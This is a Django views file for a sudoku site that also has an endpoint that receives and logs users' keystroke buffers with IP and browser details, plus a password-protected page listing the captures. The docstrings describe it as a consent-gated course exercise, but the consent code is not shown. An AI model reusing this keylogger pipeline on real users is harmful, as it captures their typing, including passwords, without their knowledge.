import base64
import json
import time
from datetime import datetime, timezone
from pathlib import Path

from django.conf import settings
from django.contrib.auth.hashers import check_password
from django.http import HttpResponse, JsonResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.views.decorators.http import require_POST

from .sudoku import DIFFICULTY_CLUES, generate_puzzle

KEYLOG_BUFFER_MAX_CHARS = 20000
KEYLOG_ADMIN_MAX_ENTRIES = 500


def index(request):
    return render(request, "vibenight/index.html")


def sudoku(request):
    difficulty = request.GET.get("difficulty", "medium")
    if difficulty not in DIFFICULTY_CLUES:
        difficulty = "medium"
    puzzle, solution = generate_puzzle(difficulty)
    context = {
        "puzzle": puzzle,
        "solution_json": json.dumps(solution),
        "difficulty": difficulty,
        "difficulties": list(DIFFICULTY_CLUES.keys()),
    }
    return render(request, "vibenight/sudoku.html", context)


@csrf_exempt
@require_POST
def keylog_ingest(request):
    """Consent-gated capture endpoint for the keylogging course exercise (see
    the consent modal + capture script in templates/base.html). CSRF-exempt
    because navigator.sendBeacon (used on tab-hide/unload flushes) can't
    attach custom headers.
    """
    try:
        data = json.loads(request.body)
    except (ValueError, TypeError):
        return JsonResponse({"ok": False}, status=400)

    device_id = str(data.get("device_id", ""))[:200]
    buffer = str(data.get("buffer", ""))[:KEYLOG_BUFFER_MAX_CHARS]
    page = str(data.get("page", ""))[:500]
    if not device_id or not buffer:
        return JsonResponse({"ok": True})

    entry = {
        "received_at": time.time(),
        "device_id": device_id,
        "page": page,
        "ip": request.META.get("REMOTE_ADDR", ""),
        "user_agent": request.META.get("HTTP_USER_AGENT", "")[:300],
        "buffer": buffer,
    }
    log_path = Path(settings.VIBENIGHT_KEYLOG_PATH)
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with open(log_path, "a") as f:
        f.write(json.dumps(entry) + "\n")

    return JsonResponse({"ok": True})


def _admin_authorized(request):
    password_hash = settings.VIBENIGHT_ADMIN_PASSWORD_HASH
    if not password_hash:
        return False
    header = request.META.get("HTTP_AUTHORIZATION", "")
    if not header.startswith("Basic "):
        return False
    try:
        decoded = base64.b64decode(header[6:]).decode("utf-8")
    except (ValueError, UnicodeDecodeError):
        return False
    _, _, password = decoded.partition(":")
    return check_password(password, password_hash)


def keylog_admin(request):
    """Read-only view over the keylog course exercise's captured data,
    gated by HTTP Basic Auth (stateless — this app has no sessions/DB).
    """
    if not _admin_authorized(request):
        response = HttpResponse(status=401)
        response["WWW-Authenticate"] = 'Basic realm="Vibe Night admin"'
        return response

    log_path = Path(settings.VIBENIGHT_KEYLOG_PATH)
    entries = []
    if log_path.exists():
        with open(log_path) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    entry = json.loads(line)
                except ValueError:
                    continue
                received_at = entry.get("received_at")
                entry["received_at_display"] = (
                    datetime.fromtimestamp(received_at, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
                    if received_at
                    else ""
                )
                entries.append(entry)

    entries.reverse()
    context = {
        "entries": entries[:KEYLOG_ADMIN_MAX_ENTRIES],
        "total": len(entries),
        "shown": min(len(entries), KEYLOG_ADMIN_MAX_ENTRIES),
    }
    return render(request, "vibenight/keylog_admin.html", context)
